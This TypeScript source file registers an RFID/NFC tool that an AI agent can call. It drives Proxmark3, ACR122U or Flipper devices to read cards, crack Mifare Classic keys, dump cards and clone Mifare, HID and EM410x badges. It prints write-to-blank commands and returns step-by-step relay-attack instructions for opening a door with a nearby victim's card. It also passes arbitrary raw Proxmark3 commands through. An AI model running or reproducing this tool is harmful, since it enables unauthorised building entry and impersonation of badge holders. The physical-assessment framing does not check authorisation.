export * as RfidNfcTool from "./rfid-nfc"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "rfid_nfc"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description: "RFID/NFC action: 'read' (read card UID/type), 'clone_mifare' (clone Mifare Classic), 'clone_hid' (clone HID iClass), 'clone_em' (clone EM410x), 'relay_attack' (relay attack setup), 'nfc_dump' (dump NFC tag), 'proxmark' (raw Proxmark3 command)",
  }),
  device: Schema.String.pipe(Schema.optional).annotate({ description: "Device: proxmark3, acr122u, flipper. Default: proxmark3." }),
  proxmark_cmd: Schema.String.pipe(Schema.optional).annotate({ description: "Raw Proxmark3 command (for proxmark action)." }),
  dump_file: Schema.String.pipe(Schema.optional).annotate({ description: "Dump file path. Default: ./card_dump.bin" }),
})

const Output = Schema.Struct({ output: Schema.String, exit: Schema.Number.pipe(Schema.optional) })

const layer = Layer.effectDiscard(Effect.gen(function* () {
  const tools = yield* Tools.Service
  const appProcess = yield* AppProcess.Service

  yield* tools.register({
    [name]: Tool.make({
      description: `RFID/NFC card cloning and exploitation. Read card UID and type, clone Mifare Classic cards (with key cracking), clone HID iClass badges, clone EM410x prox cards, set up relay attacks for real-time card duplication, dump NFC tag data, and send raw Proxmark3 commands. Supports Proxmark3, ACR122U, and Flipper Zero. Essential for physical security assessment.`,
      input: Input, output: Output,
      toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
      execute: (input) => Effect.gen(function* () {
        const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"
        const device = input.device ?? "proxmark3"
        const dumpFile = input.dump_file ?? "./card_dump.bin"

        switch (input.action) {
          case "read": {
            const cmd = device === "proxmark3"
              ? ChildProcess.make("proxmark3", ["/dev/ttyACM0", "-c", "hf search"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
              : ChildProcess.make("nfc-list", [], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
            const r = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(30), maxOutputBytes: 256 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
            return { exit: r?.exitCode, output: r?.output?.toString("utf8") ?? `${device} not found or no card detected.` }
          }

          case "clone_mifare": {
            const results: string[] = ["=== MIFARE CLASSIC CLONE ===\n"]
            // Step 1: Get keys via darkside attack or nested auth
            const keyCmd = ChildProcess.make("proxmark3", ["/dev/ttyACM0", "-c", "hf mf autopwn"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(30) })
            const keyR = yield* appProcess.run(keyCmd, { combineOutput: true, timeout: Duration.minutes(2), maxOutputBytes: 512 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
            results.push("--- KEY RECOVERY ---")
            results.push(keyR?.output?.toString("utf8") ?? "Failed. Place card on Proxmark3 and retry.")
            // Step 2: Dump card
            const dumpCmd = ChildProcess.make("proxmark3", ["/dev/ttyACM0", "-c", `hf mf dump 1 A`], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(30) })
            const dumpR = yield* appProcess.run(dumpCmd, { combineOutput: true, timeout: Duration.minutes(2), maxOutputBytes: 512 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
            results.push("\n--- CARD DUMP ---")
            results.push(dumpR?.output?.toString("utf8") ?? "Dump failed.")
            results.push("\n[INFO] To write to blank card:")
            results.push(`proxmark3 /dev/ttyACM0 -c "hf mf restore 1 A"`)
            return { exit: 0, output: results.join("\n") }
          }

          case "clone_em": {
            const cmd = ChildProcess.make("proxmark3", ["/dev/ttyACM0", "-c", "lf em410x read"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
            const r = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(30), maxOutputBytes: 256 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
            const output = r?.output?.toString("utf8") ?? ""
            return {
              exit: r?.exitCode,
              output: output + "\n\nTo clone to T5577:\nproxmark3 /dev/ttyACM0 -c \"lf em410x write T5577 <UID>\"",
            }
          }

          case "clone_hid": {
            const cmd = ChildProcess.make("proxmark3", ["/dev/ttyACM0", "-c", "lf hid read"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
            const r = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(30), maxOutputBytes: 256 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
            const output = r?.output?.toString("utf8") ?? ""
            return {
              exit: r?.exitCode,
              output: output + "\n\nTo clone:\nproxmark3 /dev/ttyACM0 -c \"lf hid clone <FACILITY> <CARD_NUM>\"\nOr on Flipper Zero: NFC > Read > Save > Write to blank card",
            }
          }

          case "nfc_dump": {
            const cmd = ChildProcess.make("nfc-mfclassic", ["r", dumpFile, "a"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(30) })
            const r = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.minutes(2), maxOutputBytes: 512 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
            return { exit: r?.exitCode, output: r?.output?.toString("utf8") ?? "nfc-mfclassic not found. Install: apt install libnfc-bin" }
          }

          case "relay_attack": {
            return { exit: 0, output: `RFID Relay Attack Setup:

1. Attacker positions near victim with reader device
2. Relay device forwards signal to accomplice near target door
3. Accomplice presents relayed signal to reader
4. Door opens as if victim's card was present

Tools needed:
- Two NRF52840 or Proxmark3 devices
- Relay software (custom or RFIDIOt)

Setup:
- Device 1 (near victim): reads card continuously
- Device 2 (near door): emulates card
- Communication: Bluetooth/WiFi between devices

Latency must be < 1 second for most readers to accept.

For Proxmark3 relay:
proxmark3 /dev/ttyACM0 -c "hf 14a relay"` }
          }

          case "proxmark": {
            const cmd = ChildProcess.make("proxmark3", ["/dev/ttyACM0", "-c", input.proxmark_cmd ?? "hw status"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(30) })
            const r = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.minutes(2), maxOutputBytes: 512 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
            return { exit: r?.exitCode, output: r?.output?.toString("utf8") ?? "Proxmark3 command failed." }
          }

          default:
            return { output: `Unknown action: ${input.action}. Supported: read, clone_mifare, clone_hid, clone_em, relay_attack, nfc_dump, proxmark` }
        }
      }).pipe(Effect.mapError(() => new ToolFailure({ message: "RFID/NFC operation failed" }))),
    }),
  }).pipe(Effect.orDie)
}))

export const node = makeLocationNode({ name: "tool/rfid-nfc", layer, deps: [ToolRegistry.node, AppProcess.node] })
